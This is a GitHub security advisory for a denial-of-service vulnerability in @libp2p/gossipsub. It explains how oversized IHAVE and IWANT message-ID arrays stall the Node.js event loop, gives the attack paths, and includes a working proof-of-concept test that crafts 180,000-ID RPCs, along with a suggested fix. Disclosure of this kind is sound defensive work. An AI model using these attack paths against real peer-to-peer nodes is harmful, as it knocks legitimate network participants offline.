# [H] libp2p: CPU DoS via oversized IHAVE and IWANT control message arrays

## Summary
Severity: High
Advisory: GHSA-cwc9-cp4j-mcvv
CVE: CVE-2026-49866
CWE: CWE-20, CWE-400, CWE-770
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-10
Source: https://github.com/advisories/GHSA-cwc9-cp4j-mcvv
Type: github-advisory

## Affected
- npm: `@libp2p/gossipsub` — affected >=0 <16.0.0

## Details
### Summary
gossipsub processes IHAVE and IWANT control messages by iterating every received message ID synchronously before doing anything with the results. There is no cap on how many IDs a single frame may contain. The default LP frame limit is 4MB, which fits roughly 180,000 message IDs. Iterating that many IDs blocks the Node.js event loop for around 200ms per call.

The two variants have different severity. For IHAVE there is a per-peer per-heartbeat counter that limits each peer to one full iteration per heartbeat, so causing a total stall requires around 10 Sybil peers. For IWANT there is no equivalent counter at all, so a single peer continuously streaming 4MB frames can hold the event loop above 80% utilisation indefinitely.

### Details
### No decode-time cap on message ID count (`message/decodeRpc.ts:11-19`)
```typescript                                                                                             
export const defaultDecodeRpcLimits: DecodeRPCLimits = {
  maxSubscriptions: Infinity,
  maxMessages: Infinity,
  maxIhaveMessageIDs: Infinity,
  maxIwantMessageIDs: Infinity,
  maxIdontwantMessageIDs: Infinity,
  maxControlMessages: Infinity,
  maxPeerInfos: Infinity
}
```

These are the defaults unless the operator explicitly overrides `opts.decodeRpcLimits`. A `TODO` at `gossipsub.ts:857` already notes the gap: `// TODO: Check max gossip message size, before decodeRpc()`.

### IHAVE iterates all IDs before truncating (`gossipsub.ts:1311-1327`)

```typescript                                                                                                                                                                                                         
messageIDs.forEach((msgId) => {                                                                            
  const msgIdStr = this.msgIdToStrFn(msgId)                                                               
  if (!this.seenCache.has(msgIdStr)) {                                                                     
    iwant.set(msgIdStr, msgId)                                                                            
  }                                                                                                       
})                                                                                                        
// truncation to GossipsubMaxIHaveLength (5000) only happens after the loop finishes                      
```

The per-peer flood counters (`iasked`, `peerhave`) do cap things eventually: each peer is limited to 10 IHAVE RPCs and 5000 IDs counted per heartbeat. After the first oversized IHAVE from a peer, subsequent ones are rejected cheaply. The problem is that the cap is per peer, so 10 Sybil peers each sending one 180K-ID IHAVE per heartbeat gives 10 x 150ms = 1500ms of synchronous work against a 1000ms heartbeat interval.

### IWANT has no rate limit at all (`gossipsub.ts:1377-1394`)
```typescript                                        
messageIDs?.forEach((msgId) => {                     
  const msgIdStr = this.msgIdToStrFn(msgId)          
  const entry = this.mcache.getWithIWantCount(msgIdStr, id)                                               
  // ...                                                                                                  
})                                                                                                        
```

Unlike IHAVE, `handleIWant` has no `peerhave` or `iasked` equivalent. A single peer can send IWANT RPCs continuously with no per-heartbeat limit. Sending IWANT for non-existent messages does not affect the attacker's score (`onIwantRcv` is metrics-only), so there is no automatic disconnect. At 1 Gbps a 4MB frame arrives every ~32ms and takes ~135ms to process, giving roughly 81% event-loop utilisation from a single connection.

### Attack Paths
**IHAVE (requires ~10 Sybil peers)**
The attacker connects 10 peers, each subscribing to a topic the victim is on. New peers start at score 0, which is above the default `gossipThreshold` of -10, so IHAVE processing is active immediately. Each peer sends one 4MB RPC per heartbeat containing a single `ControlIHave` entry with ~180,000 random message IDs. The victim processes all 180,000 IDs per peer before the counter kicks in for that peer. Total event-loop block: around 1500ms per 1000ms heartbeat.

**IWANT (single peer, no Sybil)**
The attacker connects once and streams 4MB IWANT RPCs continuously, each containing ~180,000 random message IDs that do not exist in the victim's cache. No rate limit applies. At datacenter bandwidth the event loop stays above 80% utilisation indefinitely.

### PoC
Setup and execution of PoC
```bash                                              
git clone https://github.com/libp2p/js-libp2p.git
cd js-libp2p                                         
npm install                                          
cd packages/gossipsub                                
npx aegir build                                      
node --experimental-vm-modules ../../node_modules/.bin/mocha 'dist/test/poc.spec.js' --timeout 30000                                             
```
PoC Content:
```typescript
import { stop } from '@libp2p/interface'
import assert from 'node:assert'
import { performance } from 'node:perf_hooks'
import { encode as lpEncode } from 'it-length-prefixed'
import { pEvent } from 'p-event'
import { RPC } from '../src/message/rpc.js'
import { GossipsubMaxIHaveMessages, GossipsubMaxIHaveLength, GossipsubHeartbeatInterval } from '../src/constants.js'
import { createComponents, connectPubsubNodes } from './utils/create-pubsub.js'
import type { GossipSubAndComponents } from './utils/create-pubsub.js'

const TOPIC = 'poc-ihave-flood'
const MSG_ID_BYTES = 20
// 4 MB LP limit / ~22 bytes per message ID (1-byte tag + 1-byte len + 20 bytes)
const MSG_IDS_PER_IHAVE = 180_000

function randomMsgIds (count: number): Uint8Array[] {
  return Array.from({ length: count }, () => {
    const id = new Uint8Array(MSG_ID_BYTES)
    crypto.getRandomValues(id)
    return id
  })
}

describe('CPU DoS via oversized IHAVE and IWANT control message arrays', function () {
  this.timeout(30_000)

  let victim: GossipSubAndComponents
  let attacker: GossipSubAndComponents

  beforeEach(async () => {
    ;[victim, attacker] = await Promise.all([
      createComponents({ init: { allowPublishToZeroTopicPeers: true } }),
      createComponents({ init: { allowPublishToZeroTopicPeers: true } })
    ])

    // Both subscribe to the topic so the victim builds a mesh entry
    victim.pubsub.subscribe(TOPIC)
    attacker.pubsub.subscribe(TOPIC)

    await connectPubsubNodes(victim, attacker)

    // Wait for one heartbeat so the victim's mesh includes the attacker
    await pEvent(victim.pubsub, 'gossipsub:heartbeat')
  })

  afterEach(async () => {
    await stop(
      victim.pubsub, attacker.pubsub,
      ...Object.values(victim.components),
      ...Object.values(attacker.components)
    )
  })

  it('BYPASS: single IHAVE with 180K message IDs blocks event loop for ~135ms', async () => {
    const attackerIdStr = attacker.components.peerId.toString()

    // Verify attacker is in victim's mesh (required for handleIHave to iterate IDs)
    const meshPeers = (victim.pubsub as any).mesh.get(TOPIC) as Set<string> | undefined
    if (meshPeers == null || !meshPeers.has(attackerIdStr)) {
      // Force mesh membership for the PoC if heartbeat hasn't built it yet
      if (meshPeers == null) {
        (victim.pubsub as any).mesh.set(TOPIC, new Set([attackerIdStr]))
      } else {
        meshPeers.add(attackerIdStr)
      }
    }

    const messageIDs = randomMsgIds(MSG_IDS_PER_IHAVE)

    // Invoke handleIHave directly
    const t0 = performance.now()
    const iwant = (victim.pubsub as any).handleIHave(
      attackerIdStr,
      [{ topicID: TOPIC, messageIDs }]
    ) as Array<{ messageIDs: Uint8Array[] }>
    const elapsed = performance.now() - t0

    console.log(`\n[PoC] 1 IHAVE × ${MSG_IDS_PER_IHAVE.toLocaleString()} IDs: ${elapsed.toFixed(0)} ms event-loop block`)
    console.log(`[PoC] Response capped at: ${iwant[0]?.messageIDs?.length ?? 0} IWANTs (limit: ${GossipsubMaxIHaveLength})`)
    console.log(`[PoC] Heartbeat interval:  ${GossipsubHeartbeatInterval} ms`)

    // The blocking time should be significant (>>10ms) for a meaningful DoS
    assert.ok(elapsed > 50,
      `expected >50ms event-loop block for ${MSG_IDS_PER_IHAVE} IDs, got ${elapsed.toFixed(0)}ms`)

    // Victim caps the response regardless of how many IDs were iterated
    assert.ok(
      iwant[0]?.messageIDs?.length <= GossipsubMaxIHaveLength,
      `response should be capped at ${GossipsubMaxIHaveLength}`
    )
  })

  it('MULTI-PEER: N peers × 1 IHAVE each, iasked resets per peer, total block scales linearly', async () => {
    const N_PEERS = 10
    const messageIDs = randomMsgIds(MSG_IDS_PER_IHAVE)

    // Ensure mesh includes a placeholder topic so !this.mesh.has(topicID) passes
    const fakeMeshPeers: Set<string> = new Set()
    ;(victim.pubsub as any).mesh.set(TOPIC, fakeMeshPeers)

    let totalElapsed = 0

    for (let i = 0; i < N_PEERS; i++) {
      // Each "Sybil" peer uses a unique peer ID string
      const fakePeerId = `12D3KooW${i.toString().padStart(36, '0')}`
      fakeMeshPeers.add(fakePeerId)

      // Fresh counters: simulates a peer the victim hasn't seen this heartbeat
      ;(victim.pubsub as any).peerhave.delete(fakePeerId)
      ;(victim.pubsub as any).iasked.delete(fakePeerId)
      // Score defaults to 0 (> gossipThreshold of -10): no score entry needed

      const t0 = performance.now()
      ;(victim.pubsub as any).handleIHave(fakePeerId, [{ topicID: TOPIC, messageIDs }])
      const elapsed = performance.now() - t0

      totalElapsed += elapsed
      process.stdout.write(`  peer ${i + 1}/${N_PEERS}: ${elapsed.toFixed(0)} ms\n`)
    }

    const ratio = totalElapsed / GossipsubHeartbeatInterval
    console.log(`\n[PoC] ${N_PEERS} peers × ${MSG_IDS_PER_IHAVE.toLocaleString()} IDs: ${totalElapsed.toFixed(0)} ms total`)
    console.log(`[PoC] Heartbeat interval:                    ${GossipsubHeartbeatInterval} ms`)
    console.log(`[PoC] Ratio (block / heartbeat):             ${ratio.toFixed(2)}x`)
    console.log(`[PoC] Attacker cost: ${N_PEERS} × 4 MB = ${N_PEERS * 4} MB/s outbound`)
    console.log(`[PoC] Each peer's iasked resets at heartbeat — sustainable indefinitely`)

    // 10 peers should easily exceed the 1s heartbeat interval
    assert.ok(
      totalElapsed > GossipsubHeartbeatInterval * 0.9,
      `expected ${N_PEERS} peers to block ≥ ${GossipsubHeartbeatInterval * 0.9} ms, got ${totalElapsed.toFixed(0)} ms`
    )
  })

  it('ENCODE: crafted 180K-ID IHAVE RPC fits within 4 MB LP frame limit', () => {
    const messageIDs = randomMsgIds(MSG_IDS_PER_IHAVE)

    const rpc = RPC.encode({
      subscriptions: [],
      messages: [],
      control: {
        ihave: [{ topicID: TOPIC, messageIDs }],
        iwant: [],
        graft: [],
        prune: [],
        idontwant: []
      }
    })

    const MAX_LP_BYTES = 4 * 1024 * 1024  // DEFAULT_MAX_DATA_LENGTH from it-length-prefixed

    console.log(`\n[PoC] Serialised RPC size: ${(rpc.byteLength / (1024 * 1024)).toFixed(2)} MB`)
    console.log(`[PoC] LP frame limit:      ${MAX_LP_BYTES / (1024 * 1024)} MB`)
    console.log(`[PoC] Fits in one frame:   ${rpc.byteLength <= MAX_LP_BYTES ? 'YES ✓' : 'NO ✗'}`)
    console.log(`[PoC] defaultDecodeRpcLimits.maxIhaveMessageIDs = Infinity (no decode-level cap)`)

    assert.ok(rpc.byteLength <= MAX_LP_BYTES,
      `crafted RPC (${rpc.byteLength} bytes) must fit in the 4 MB LP default — confirms no LP-level protection`)
  })
})
```

The IWANT variant has the same per-frame timing but does not need Sybil peers. A separate IWANT PoC can be provided on request.

### Impact
Any node running `@libp2p/gossipsub` with default options that accepts inbound connections is affected. This includes Ethereum consensus clients using js-libp2p (Lodestar), IPFS nodes with pubsub enabled, and anything calling `createLibp2p({ services: { pubsub: gossipsub() } })`.

With 10 Sybil peers the IHAVE variant blocks the event loop for 1.5x the heartbeat interval continuously. The node cannot forward messages, run its heartbeat, or respond to legitimate peers. The IWANT variant achieves the same result from a single connection at datacenter bandwidth.

Nodes that explicitly configure `opts.decodeRpcLimits` with finite values are not affected.

## Suggested fix

Set finite defaults in `decodeRpc.ts`:
```typescript
export const defaultDecodeRpcLimits: DecodeRPCLimits = {
  maxSubscriptions: 128,
  maxMessages: 256,                                                                                                                                                                                                                                  
  maxIhaveMessageIDs: 5_000,
  maxIwantMessageIDs: 5_000,                                
  maxIdontwantMessageIDs: 5_000,
  maxControlMessages: 128,
  maxPeerInfos: 16
}
```

Setting `maxIhaveMessageIDs` and `maxIwantMessageIDs` to 5000 (matching `GossipsubMaxIHaveLength`) bounds the iteration cost to the response limit rather than attacker input.

## References
- https://github.com/libp2p/js-libp2p/security/advisories/GHSA-cwc9-cp4j-mcvv
- https://nvd.nist.gov/vuln/detail/CVE-2026-49866
- https://github.com/libp2p/js-libp2p/pull/3520
- https://github.com/libp2p/js-libp2p/commit/773dd80ded24dbd6b19e675c89fd2f3b45f2d899
- https://github.com/libp2p/js-libp2p
- https://github.com/libp2p/js-libp2p/releases/tag/gossipsub-v16.0.0
